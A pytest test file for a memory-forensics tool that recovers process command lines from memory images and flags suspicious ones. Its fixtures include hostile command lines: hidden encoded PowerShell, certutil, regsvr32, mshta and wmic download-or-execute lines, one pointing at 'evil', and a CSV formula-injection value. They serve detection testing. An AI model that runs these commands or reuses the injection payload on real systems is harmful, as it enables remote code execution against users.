import csv
import json

import pytest

from memory_cmdline.cli import main


def _recs(path):
    import json as _j
    d = _j.loads(open(path, encoding="utf-8").read())
    return d["records"] if isinstance(d, dict) and "records" in d else d
from memory_cmdline.cmdline import scan
from memory_cmdline.flags import flag, severity
from memory_cmdline.loader import MemoryImage
from memory_cmdline.peb import read_params
from memory_cmdline.procs import scan as proc_scan

import _mem


def _img(tmp_path, builder=_mem.image_encoded_powershell):
    p = tmp_path / "m.lime"
    p.write_bytes(builder())
    return MemoryImage(p)


# --------------------------------------------------------------------------
# PEB walk
# --------------------------------------------------------------------------

def test_peb_walk_resolves_command_line(tmp_path):
    img = _img(tmp_path)
    proc = proc_scan(img)[0]
    pp = read_params(img, proc, want_env=True)
    assert pp.resolved
    assert pp.peb == _mem.VA_PEB
    assert pp.params == _mem.VA_PARAMS
    assert pp.command_line.startswith("powershell.exe -nop")
    assert pp.image_path.endswith("powershell.exe")
    assert pp.current_dir == "C:\\Users\\rita\\Downloads"
    assert pp.window_title == "Windows PowerShell"


def test_environment_block(tmp_path):
    img = _img(tmp_path, _mem.image_plain)
    proc = proc_scan(img)[0]
    pp = read_params(img, proc, want_env=True)
    assert pp.environment.get("USERNAME") == "rita"
    assert "Temp" in pp.environment.get("TEMP", "")


# --------------------------------------------------------------------------
# flags
# --------------------------------------------------------------------------

def test_flag_encoded_powershell():
    f = flag("C:\\Windows\\System32\\powershell.exe",
             "powershell -nop -w hidden -enc AAAABBBBCCCCDDDD" + "Q" * 60)
    assert "powershell-encoded" in f
    assert "powershell-hidden" in f
    assert "base64-blob" in f
    assert severity(f) == "high"


def test_flag_lolbins():
    assert "certutil misuse" in flag(
        "", "certutil -urlcache -f http://x/y.exe y.exe")
    assert "regsvr32 sct/url" in flag(
        "", "regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll")
    assert "mshta remote/script" in flag(
        "", "mshta http://evil/x.hta")
    assert "wmic remote exec" in flag(
        "", "wmic /node:HOST process call create calc.exe")


def test_flag_argv0_mismatch():
    f = flag("C:\\Windows\\System32\\svchost.exe",
             "C:\\Users\\a\\AppData\\svhost.exe -k netsvcs")
    assert "argv0-mismatch" in f


def test_flag_clean_command():
    assert flag("C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE") == []
    assert flag("C:\\Windows\\System32\\notepad.exe",
                '"C:\\Windows\\System32\\notepad.exe" C:\\Users\\a\\x.txt') == []


# --------------------------------------------------------------------------
# end to end
# --------------------------------------------------------------------------

def test_scan_encoded_high(tmp_path):
    rows = scan(_img(tmp_path))
    r = rows[0]
    assert r.pid == 6120 and r.process == "powershell.exe"
    assert r.severity == "high"
    assert {"powershell-encoded", "powershell-hidden"} <= set(r.notable)


def test_scan_plain_clean(tmp_path):
    rows = scan(_img(tmp_path, _mem.image_plain))
    r = rows[0]
    assert r.pid == 4212 and r.severity == "none" and r.notable == []
    assert r.command_line.endswith("notes.txt")


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------

def test_cli_text(tmp_path, capsys):
    p = tmp_path / "m.lime"
    p.write_bytes(_mem.image_encoded_powershell())
    assert main([str(p)]) == 0
    out = capsys.readouterr().out
    assert "powershell.exe" in out and "-enc" in out
    assert "powershell-encoded" in out


def test_cli_csv_json(tmp_path):
    p = tmp_path / "m.lime"
    p.write_bytes(_mem.image_encoded_powershell())
    out = tmp_path / "c.csv"
    js = tmp_path / "c.json"
    main([str(p), "--csv", str(out), "--json", str(js), "-q"])
    rows = list(csv.DictReader(out.open(encoding="utf-8-sig")))
    assert rows[0]["process"] == "powershell.exe"
    assert "powershell-encoded" in rows[0]["notable"]
    data = _recs(js)
    assert data[0]["severity"] == "high"


def test_cli_filters(tmp_path):
    p = tmp_path / "m.lime"
    p.write_bytes(_mem.image_encoded_powershell())

    out = tmp_path / "n.csv"
    main([str(p), "--notable-only", "--csv", str(out), "-q"])
    assert len(list(csv.DictReader(out.open(encoding="utf-8-sig")))) == 1

    out2 = tmp_path / "g.csv"
    main([str(p), "--grep=-enc", "--csv", str(out2), "-q"])
    assert len(list(csv.DictReader(out2.open(encoding="utf-8-sig")))) == 1
    out2b = tmp_path / "g2.csv"
    main([str(p), "--grep", "hidden", "--csv", str(out2b), "-q"])
    assert len(list(csv.DictReader(out2b.open(encoding="utf-8-sig")))) == 1

    out3 = tmp_path / "hi.csv"
    main([str(p), "--min-severity", "high", "--csv", str(out3), "-q"])
    assert len(list(csv.DictReader(out3.open(encoding="utf-8-sig")))) == 1

    out4 = tmp_path / "p.csv"
    main([str(p), "--process", "notepad", "--csv", str(out4), "-q"])
    assert len(list(csv.DictReader(out4.open(encoding="utf-8-sig")))) == 0


def test_cli_missing_and_no_arg(tmp_path):
    assert main([str(tmp_path / "nope.lime")]) == 2
    with pytest.raises(SystemExit):
        main([])


def test_csv_injection_guard(tmp_path):
    b = _mem.Builder().process(
        "x.exe", 400,
        image_path="C:\\Windows\\Temp\\x.exe",
        cmdline="=cmd|' /C calc'!A1")
    p = tmp_path / "m.lime"
    p.write_bytes(b.lime())
    out = tmp_path / "o.csv"
    main([str(p), "--csv", str(out), "-q"])
    assert "'=cmd|" in out.read_text(encoding="utf-8-sig")
